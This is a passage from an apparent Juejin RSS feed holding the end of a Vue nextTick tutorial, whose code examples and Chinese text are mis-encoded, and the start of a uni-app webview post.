    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">MutationObserver</span> !== <span class="hljs-string">'undefined'</span>) {
      <span class="hljs-comment">// ç”¨ MutationObserver æ¨¡æ‹Ÿå¾®ä»»åŠ¡</span>
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-built_in">setTimeout</span>(flushCallbacks, <span class="hljs-number">0</span>)
    }
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">flushCallbacks</span>(<span class="hljs-params"/>) {
  pending = <span class="hljs-literal">false</span>
  <span class="hljs-keyword">const</span> copies = callbacks.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>)
  callbacks.<span class="hljs-property">length</span> = <span class="hljs-number">0</span>
  copies.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">cb</span> =&gt;</span> <span class="hljs-title function_">cb</span>())
}
</code></pre>
<h2 data-id="heading-3">å››ã€å››å¤§æ ¸å¿ƒä½¿ç”¨åœºæ™¯</h2>
<h3 data-id="heading-4">åœºæ™¯1ï¼šè·å–æ›´æ–°åçš„ DOM</h3>
<pre><code class="hljs language-vue" lang="vue">&lt;script&gt;
export default {
  methods: {
    async updateAndLog() {
      this.msg = 'æ›´æ–°åçš„æ¶ˆæ¯'
      
      // âŒ é”™è¯¯ï¼šæ­¤æ—¶ DOM è¿˜æœªæ›´æ–°
      console.log('åŒæ­¥è·å–:', this.$refs.message.textContent)
      
      // âœ… æ­£ç¡®ï¼šä½¿ç”¨ nextTick
      this.$nextTick(() =&gt; {
        console.log('nextTickè·å–:', this.$refs.message.textContent)
      })
      
      // âœ… æ›´ä¼˜é›…ï¼šasync/await ç‰ˆæœ¬
      this.msg = 'å¦ä¸€ä¸ªæ¶ˆæ¯'
      await this.$nextTick()
      console.log('awaitè·å–:', this.$refs.message.textContent)
    }
  }
}
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-5">åœºæ™¯2ï¼šæ“ä½œç¬¬ä¸‰æ–¹ DOM åº“</h3>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div ref="chartContainer"&gt;&lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
import echarts from 'echarts'

export default {
  data() {
    return { data: [] }
  },
  
  async mounted() {
    // âŒ é”™è¯¯ï¼šå®¹å™¨å¯èƒ½è¿˜æœªæ¸²æŸ“
    // this.chart = echarts.init(this.$refs.chartContainer)
    
    // âœ… æ­£ç¡®ï¼šç¡®ä¿ DOM å°±ç»ª
    this.$nextTick(() =&gt; {
      this.chart = echarts.init(this.$refs.chartContainer)
      this.renderChart()
    })
  },
  
  methods: {
    async updateChart(newData) {
      this.data = newData
      
      // ç­‰å¾… Vue æ›´æ–° DOM å’Œå›¾è¡¨æ•°æ®
      await this.$nextTick()
      
      // æ­¤æ—¶å¯ä»¥å®‰å…¨æ“ä½œå›¾è¡¨å®ä¾‹
      this.chart.setOption({
        series: [{ data: this.data }]
      })
    }
  }
}
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-6">åœºæ™¯3ï¼šè§£å†³è®¡ç®—å±æ€§ä¾èµ–é—®é¢˜</h3>
<pre><code class="hljs language-vue" lang="vue">&lt;script&gt;
export default {
  data() {
    return {
      list: [1, 2, 3],
      newItem: ''
    }
  },
  
  computed: {
    filteredList() {
      // ä¾èµ– list çš„å˜åŒ–
      return this.list.filter(item =&gt; item &gt; 1)
    }
  },
  
  methods: {
    async addItem(item) {
      this.list.push(item)
      
      // âŒ filteredList å¯èƒ½è¿˜æœªè®¡ç®—å®Œæˆ
      console.log('åˆ—è¡¨é•¿åº¦:', this.filteredList.length)
      
      // âœ… ç¡®ä¿è®¡ç®—å±æ€§å·²æ›´æ–°
      this.$nextTick(() =&gt; {
        console.log('æ­£ç¡®çš„é•¿åº¦:', this.filteredList.length)
      })
    }
  }
}
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-7">åœºæ™¯4ï¼šä¼˜åŒ–æ‰¹é‡æ›´æ–°æ€§èƒ½</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ‰¹é‡æ“ä½œç¤ºä¾‹</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">batchUpdate</span>(<span class="hljs-params">items</span>) {
  <span class="hljs-comment">// å¼€å§‹æ‰¹é‡æ›´æ–°</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">updating</span> = <span class="hljs-literal">true</span>
  
  <span class="hljs-comment">// æ‰€æœ‰æ•°æ®å˜æ›´éƒ½åœ¨åŒä¸€ä¸ªäº‹ä»¶å¾ªç¯ä¸­</span>
  items.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dataList</span>.<span class="hljs-title function_">push</span>(<span class="hljs-title function_">processItem</span>(item))
  })
  
  <span class="hljs-comment">// åªè§¦å‘ä¸€æ¬¡ DOM æ›´æ–°</span>
  <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.$nextTick()
  
  <span class="hljs-comment">// æ­¤æ—¶ DOM å·²æ›´æ–°å®Œæˆ</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">updating</span> = <span class="hljs-literal">false</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">showCompletionMessage</span>()
  
  <span class="hljs-comment">// ç»§ç»­å…¶ä»–æ“ä½œ</span>
  <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.$nextTick()
  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">triggerAnimation</span>()
}
</code></pre>
<h2 data-id="heading-8">äº”ã€æ€§èƒ½é™·é˜±ä¸æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-9">é™·é˜±1ï¼šåµŒå¥—çš„ nextTick</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// âŒ æ€§èƒ½æµªè´¹ï¼šåˆ›å»ºå¤šä¸ªå¾®ä»»åŠ¡</span>
<span class="hljs-variable language_">this</span>.$nextTick(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// æ“ä½œ1</span>
  <span class="hljs-variable language_">this</span>.$nextTick(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// æ“ä½œ2</span>
    <span class="hljs-variable language_">this</span>.$nextTick(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-comment">// æ“ä½œ3</span>
    })
  })
})

<span class="hljs-comment">// âœ… ä¼˜åŒ–ï¼šåˆå¹¶åˆ°åŒä¸€ä¸ªå›è°ƒä¸­</span>
<span class="hljs-variable language_">this</span>.$nextTick(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// æ“ä½œ1</span>
  <span class="hljs-comment">// æ“ä½œ2  </span>
  <span class="hljs-comment">// æ“ä½œ3</span>
})
</code></pre>
<h3 data-id="heading-10">é™·é˜±2ï¼šä¸å®ä»»åŠ¡æ··ç”¨</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// âŒ é¡ºåºä¸å¯æ§</span>
<span class="hljs-variable language_">this</span>.<span class="hljs-property">msg</span> = <span class="hljs-string">'æ›´æ–°'</span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">message</span>.<span class="hljs-property">textContent</span>)
}, <span class="hljs-number">0</span>)

<span class="hljs-comment">// âœ… æ˜ç¡®ä½¿ç”¨ nextTick</span>
<span class="hljs-variable language_">this</span>.<span class="hljs-property">msg</span> = <span class="hljs-string">'æ›´æ–°'</span>
<span class="hljs-variable language_">this</span>.$nextTick(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">message</span>.<span class="hljs-property">textContent</span>)
})
</code></pre>
<h3 data-id="heading-11">æœ€ä½³å®è·µï¼šä½¿ç”¨ async/await</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">methods</span>: {
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">reliableUpdate</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 1. æ›´æ–°æ•°æ®</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchData</span>()
    
    <span class="hljs-comment">// 2. ç­‰å¾… DOM æ›´æ–°</span>
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.$nextTick()
    
    <span class="hljs-comment">// 3. æ“ä½œæ›´æ–°åçš„ DOM</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">scrollToBottom</span>()
    
    <span class="hljs-comment">// 4. å¦‚æœéœ€è¦ï¼Œå†æ¬¡ç­‰å¾…</span>
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.$nextTick()
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">triggerAnimation</span>()
    
    <span class="hljs-keyword">return</span> <span class="hljs-string">'æ›´æ–°å®Œæˆ'</span>
  }
}
</code></pre>
<h2 data-id="heading-12">å…­ã€Vue 3 çš„å˜åŒ–ä¸ä¼˜åŒ–</h2>
<p>Vue 3 çš„ <code>nextTick</code> æ›´åŠ ç²¾ç®€é«˜æ•ˆï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Vue 3 ä¸­çš„ä½¿ç”¨</span>
<span class="hljs-keyword">import</span> { nextTick } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-comment">// æ–¹å¼1ï¼šå›è°ƒå‡½æ•°</span>
<span class="hljs-title function_">nextTick</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'DOM å·²æ›´æ–°'</span>)
})

<span class="hljs-comment">// æ–¹å¼2ï¼šPromise</span>
<span class="hljs-keyword">await</span> <span class="hljs-title function_">nextTick</span>()
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'DOM å·²æ›´æ–°'</span>)

<span class="hljs-comment">// æ–¹å¼3ï¼šComposition API</span>
<span class="hljs-title function_">setup</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClick</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    state.<span class="hljs-property">value</span> = <span class="hljs-string">'æ–°å€¼'</span>
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">nextTick</span>()
    <span class="hljs-comment">// æ“ä½œ DOM</span>
  }
  
  <span class="hljs-keyword">return</span> { handleClick }
}
</code></pre>
<p><strong>Vue 3 çš„ä¼˜åŒ–ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨ <code>Promise.resolve().then()</code> ä½œä¸ºé»˜è®¤ç­–ç•¥</li>
<li>ç§»é™¤å…¼å®¹æ€§ä»£ç ï¼Œæ›´å°çš„ä½“ç§¯</li>
<li>æ›´å¥½çš„ TypeScript æ”¯æŒ</li>
</ul>
<h2 data-id="heading-13">ä¸ƒã€æºç çº§ç†è§£</h2>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Vue 2.x nextTick æ ¸å¿ƒé€»è¾‘</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">nextTick</span>(<span class="hljs-params">cb, ctx</span>) {
  <span class="hljs-keyword">let</span> _resolve
  
  <span class="hljs-comment">// 1. å°†å›è°ƒæ¨å…¥é˜Ÿåˆ—</span>
  callbacks.<span class="hljs-title function_">push</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (cb) {
      <span class="hljs-keyword">try</span> {
        cb.<span class="hljs-title function_">call</span>(ctx)
      } <span class="hljs-keyword">catch</span> (e) {
        <span class="hljs-title function_">handleError</span>(e, ctx, <span class="hljs-string">'nextTick'</span>)
      }
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (_resolve) {
      <span class="hljs-title function_">_resolve</span>(ctx)
    }
  })
  
  <span class="hljs-comment">// 2. å¦‚æœæœªåœ¨ç­‰å¾…ï¼Œå¼€å§‹å¼‚æ­¥æ‰§è¡Œ</span>
  <span class="hljs-keyword">if</span> (!pending) {
    pending = <span class="hljs-literal">true</span>
    <span class="hljs-title function_">timerFunc</span>() <span class="hljs-comment">// è§¦å‘å¼‚æ­¥æ›´æ–°</span>
  }
  
  <span class="hljs-comment">// 3. æ”¯æŒ Promise é“¾å¼è°ƒç”¨</span>
  <span class="hljs-keyword">if</span> (!cb &amp;&amp; <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Promise</span> !== <span class="hljs-string">'undefined'</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {
      _resolve = resolve
    })
  }
}
</code></pre>
<h2 data-id="heading-14">å…«ã€å®æˆ˜ï¼šæ‰‹å†™ç®€æ˜“ nextTick</h2>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyVue</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">callbacks</span> = []
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">pending</span> = <span class="hljs-literal">false</span>
  }
  
  $nextTick(cb) {
    <span class="hljs-comment">// è¿”å› Promise æ”¯æŒ async/await</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {
      <span class="hljs-keyword">const</span> <span class="hljs-title function_">wrappedCallback</span> = (<span class="hljs-params"/>) =&gt; {
        <span class="hljs-keyword">if</span> (cb) <span class="hljs-title function_">cb</span>()
        <span class="hljs-title function_">resolve</span>()
      }
      
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">callbacks</span>.<span class="hljs-title function_">push</span>(wrappedCallback)
      
      <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">pending</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">pending</span> = <span class="hljs-literal">true</span>
        
        <span class="hljs-comment">// ä¼˜å…ˆä½¿ç”¨å¾®ä»»åŠ¡</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Promise</span> !== <span class="hljs-string">'undefined'</span>) {
          <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">flushCallbacks</span>())
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">flushCallbacks</span>(), <span class="hljs-number">0</span>)
        }
      }
    })
  }
  
  <span class="hljs-title function_">flushCallbacks</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">pending</span> = <span class="hljs-literal">false</span>
    <span class="hljs-keyword">const</span> copies = <span class="hljs-variable language_">this</span>.<span class="hljs-property">callbacks</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>)
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">callbacks</span>.<span class="hljs-property">length</span> = <span class="hljs-number">0</span>
    copies.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">cb</span> =&gt;</span> <span class="hljs-title function_">cb</span>())
  }
  
  <span class="hljs-comment">// æ¨¡æ‹Ÿæ•°æ®æ›´æ–°</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">setData</span>(<span class="hljs-params">key, value</span>) {
    <span class="hljs-variable language_">this</span>[key] = value
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.$nextTick()
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`DOM å·²æ›´æ–°: <span class="hljs-subst">${key}</span> = <span class="hljs-subst">${value}</span>`</span>)
  }
}
</code></pre>
<h2 data-id="heading-15">æ€»ç»“</h2>
<h3 data-id="heading-16">nextTick çš„ä¸‰å±‚ç†è§£ï¼š</h3>
<ol>
<li><strong>è¡¨è±¡å±‚</strong>ï¼šåœ¨ DOM æ›´æ–°åæ‰§è¡Œä»£ç </li>
<li><strong>åŸç†å±‚</strong>ï¼šVue å¼‚æ­¥æ›´æ–°é˜Ÿåˆ—çš„è°ƒåº¦å™¨</li>
<li><strong>å®ç°å±‚</strong>ï¼šåŸºäº JavaScript äº‹ä»¶å¾ªç¯çš„å¾®ä»»åŠ¡ç®¡ç†å™¨</li>
</ol>
<h3 data-id="heading-17">ä½¿ç”¨åŸåˆ™ï¼š</h3>
<ol>
<li><strong>éœ€è¦è®¿é—®æ›´æ–°åçš„ DOM æ—¶ï¼Œå¿…é¡»ç”¨ nextTick</strong></li>
<li><strong>æ“ä½œç¬¬ä¸‰æ–¹åº“å‰ï¼Œå…ˆç­‰ Vue æ›´æ–°å®Œæˆ</strong></li>
<li><strong>æ‰¹é‡æ“ä½œåï¼Œç”¨ nextTick ç»Ÿä¸€å¤„ç†å‰¯ä½œç”¨</strong></li>
<li><strong>ä¼˜å…ˆä½¿ç”¨ async/await è¯­æ³•ï¼Œæ›´æ¸…æ™°ç›´è§‚</strong></li>
</ol>
<h3 data-id="heading-18">ä¸€å¥è¯æ¦‚æ‹¬ï¼š</h3>
<p><strong>nextTick æ˜¯ Vue ç»™ä½ çš„ä¸€ä¸ªæ‰¿è¯ºï¼š"ç­‰æˆ‘æŠŠ DOM æ›´æ–°å®Œï¼Œå†æ‰§è¡Œä½ çš„ä»£ç "ã€‚</strong></p>
<p>è®°ä½è¿™ä¸ªæ‰¿è¯ºï¼Œä½ å°±èƒ½å®Œç¾æŒæ§ Vue çš„æ›´æ–°æ—¶æœºã€‚</p>
<hr/>
<p><strong>æ€è€ƒé¢˜ï¼š</strong>
å¦‚æœè¿ç»­ä¿®æ”¹åŒä¸€ä¸ªæ•°æ® 1000 æ¬¡ï¼ŒVue ä¼šè§¦å‘å¤šå°‘æ¬¡ DOM æ›´æ–°ï¼Ÿ
ï¼ˆç­”æ¡ˆï¼šå¾—ç›Šäº nextTick çš„é˜Ÿåˆ—æœºåˆ¶ï¼Œåªä¼šè§¦å‘ 1 æ¬¡ï¼‰</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[uni-appä½¿ç”¨html5+åˆ›å»ºwebviewï¼Œå¯ä»¥æ§åˆ¶çª—å£å¤§å°ã€æ˜¾éšã€ä¸unié€šä¿¡]]></title>    <link>https://juejin.cn/post/7594863660297994282</link>    <guid>https://juejin.cn/post/7594863660297994282</guid>    <pubDate>2026-01-14T11:03:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594863660297994282" data-draft-id="7594262760939700258" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="uni-appä½¿ç”¨html5+åˆ›å»ºwebviewï¼Œå¯ä»¥æ§åˆ¶çª—å£å¤§å°ã€æ˜¾éšã€ä¸unié€šä¿¡"/> <meta itemprop="keywords" content="å‰ç«¯,Trae"/> <meta itemprop="datePublished" content="2026-01-14T11:03:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æå‰‘ä¸€"/> <meta itemprop="url" content="https://juejin.cn/user/4147782344247918"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            uni-appä½¿ç”¨html5+åˆ›å»ºwebviewï¼Œå¯ä»¥æ§åˆ¶çª—å£å¤§å°ã€æ˜¾éšã€ä¸unié€šä¿¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4147782344247918/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æå‰‘ä¸€
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T11:03:25.000Z" title="Wed Jan 14 2026 11:03:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ€è¿‘ä½¿ç”¨ uni-app å¼€å‘å®‰å“ç«¯çš„ Appï¼Œå› 